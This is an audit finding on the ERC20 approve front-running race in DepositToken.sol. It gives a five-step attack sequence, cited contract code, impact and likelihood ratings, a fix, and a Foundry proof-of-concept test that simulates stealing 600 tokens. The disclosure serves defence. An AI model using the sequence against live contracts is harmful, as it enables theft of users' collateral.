### Title
DepositToken.approve allowance race lets a spender front-run an allowance change and steal more msdTOKEN than intended - (File: contracts/DepositToken.sol)

### Summary
`DepositToken.approve` at `contracts/DepositToken.sol:187-190` overwrites `allowance[owner][spender]` directly, reproducing the classic ERC20 approve front-running race described in the external report. A spender who sees a pending `approve(spender, newAmount)` transaction can first spend the old allowance via `transferFrom`, then spend the new allowance after the victim's tx lands, extracting `old + new` total instead of `new`.

### Finding Description
`approve` calls `_approve(_msgSender(), spender_, amount_)`, which unconditionally sets `allowance[owner_][spender_] = amount_` at `contracts/DepositToken.sol:432-438`. [1](#0-0) [2](#0-1) 

`transferFrom` at `contracts/DepositToken.sol:357-376` only checks `unlockedBalanceOf` (i.e., that the tokens aren't locked as collateral backing debt) and the current allowance; there is no require-zero-then-set pattern. So the attack sequence is:

1. Victim previously approved attacker for `A` msdTOKEN.
2. Victim broadcasts `approve(attacker, B)`.
3. Attacker front-runs with `transferFrom(victim, attacker, A)` (succeeds while allowance is still `A`).
4. Victim's `approve(attacker, B)` executes, resetting allowance to `B`.
5. Attacker calls `transferFrom(victim, attacker, B)` again — total stolen `A + B` vs. intended `B`.

The stolen msdTOKEN can be redeemed for underlying collateral via `withdraw` (burns and pulls from `Treasury` at `contracts/DepositToken.sol:536-554`), so the loss is real underlying value, provided the victim's position has enough unlocked balance. The same pattern exists in `SyntheticToken.approve`/`_approve`, but bridged synthetics make DepositToken the higher-impact surface since it is directly backed by Treasury-held collateral.

Nothing stops this on the deployed configuration: `approve`/`transferFrom` are public, `transferFrom` is `nonReentrant` only (irrelevant across transactions), and `_msgSender()` via `SynthContext` resolves to `msg.sender` for direct calls, so an unprivileged EOA works.

### Impact Explanation
Direct theft of user funds: the attacker extracts `A + B` worth of deposit tokens while the victim only intended to grant `B`. Deposit tokens are redeemable 1:1 (minus withdraw fee) for underlying collateral held in `Treasury`, so the loss is concrete collateral.

### Likelihood Explanation
Requires the victim to change a non-zero allowance to another non-zero value via `approve` (rather than the provided `increaseAllowance`/`decreaseAllowance` at `contracts/DepositToken.sol:195-203` and `255-259`), and the attacker must win a front-run/sandwich of that tx. Both conditions are realistic but depend on victim behavior, so likelihood is moderate rather than high — consistent with the original report's Medium severity.

### Recommendation
Either remove the plain `approve` and force `increaseAllowance`/`decreaseAllowance` usage, or require the allowance to be reset to zero before setting a new non-zero value (USDT-style check in `_approve`). Document that integrators should use the increment/decrement helpers.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {DepositToken} from "../contracts/DepositToken.sol";

contract ApproveFrontRunTest is Test {
    DepositToken depositToken; // deployed & initialized via fixtures
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function test_approveFrontRun() public {
        // setup: victim holds 1000 unlocked msdTOKEN, approved attacker for 500
        vm.prank(victim);
        depositToken.approve(attacker, 500);

        // mempool: victim wants to change allowance to 100
        // attacker front-runs, spending the old 500 first
        vm.prank(attacker);
        depositToken.transferFrom(victim, attacker, 500);

        // victim's approve lands
        vm.prank(victim);
        depositToken.approve(attacker, 100);

        // attacker spends the new allowance too
        vm.prank(attacker);
        depositToken.transferFrom(victim, attacker, 100);

        // attacker stole 600 while victim intended max 100 outstanding
        assertEq(depositToken.balanceOf(attacker), 600);
        assertEq(depositToken.balanceOf(victim), 400);
    }
}
``` [3](#0-2) [4](#0-3)

### Citations

**File:** contracts/DepositToken.sol (L187-190)
```text
    function approve(address spender_, uint256 amount_) external override returns (bool) {
        _approve(_msgSender(), spender_, amount_);
        return true;
    }
```

**File:** contracts/DepositToken.sol (L357-376)
```text
    function transferFrom(
        address sender_,
        address recipient_,
        uint256 amount_
    ) external override nonReentrant returns (bool) {
        _revertIfLocked(sender_, amount_);

        address _msgSender = _msgSender();
        uint256 _currentAllowance = allowance[sender_][_msgSender];
        if (_currentAllowance != type(uint256).max) {
            if (_currentAllowance < amount_) revert AmountExceedsAllowance();
            unchecked {
                _approve(sender_, _msgSender, _currentAllowance - amount_);
            }
        }

        _transfer(sender_, recipient_, amount_);

        return true;
    }
```

**File:** contracts/DepositToken.sol (L432-438)
```text
    function _approve(address owner_, address spender_, uint256 amount_) private {
        if (owner_ == address(0)) revert ApproveFromTheZeroAddress();
        if (spender_ == address(0)) revert ApproveToTheZeroAddress();

        allowance[owner_][spender_] = amount_;
        emit Approval(owner_, spender_, amount_);
    }
```

**File:** contracts/DepositToken.sol (L536-554)
```text
    function _withdraw(
        address account_,
        uint256 amount_,
        address to_
    ) private whenNotShutdown nonReentrant onlyIfDepositTokenExists returns (uint256 _withdrawn, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();

        IPool _pool = pool;

        (_withdrawn, _fee) = quoteWithdrawOut(amount_);
        if (_fee > 0) {
            _transfer(account_, _pool.feeCollector(), _fee);
        }

        _burn(account_, _withdrawn);
        _pool.treasury().pull(to_, _withdrawn);

        emit CollateralWithdrawn(account_, to_, amount_, _withdrawn, _fee);
    }
```
